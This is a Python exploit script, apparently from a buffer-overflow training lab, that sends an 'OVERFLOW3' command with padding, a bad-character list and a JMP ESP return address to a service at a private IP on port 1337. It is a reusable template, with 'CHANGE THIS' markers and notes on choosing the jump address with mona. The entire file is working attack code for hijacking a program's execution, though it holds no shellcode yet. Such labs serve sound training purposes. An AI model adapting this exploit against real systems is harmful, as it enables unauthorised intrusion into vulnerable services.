#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack('<I', data)

host, port = "10.10.154.224", 1337 # CHANGE THIS.

all_chars = bytearray(range(1,256))

bad_chars = [ # CHANGE THIS.
	b"\x11",
	b"\x40",
	b"\x5f",
	b"\xb8",
	b"\xee",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")


command = b"OVERFLOW3 " # CHANGE THIS.
length = 1500 # CHANGE THIS.
offset = 1274 # CHANGE THIS.
jmp_esp = p32(0x62501205) # CHANGE THIS: Pick this one by exec '!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"' then '!mona' and scroll up. Choose the one w/ the less Sec.

payload = b"".join(
	[
		command,
		b"A" * offset,
		jmp_esp,
		b"C" * ( length - len(jmp_esp) - offset),
	]
)

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)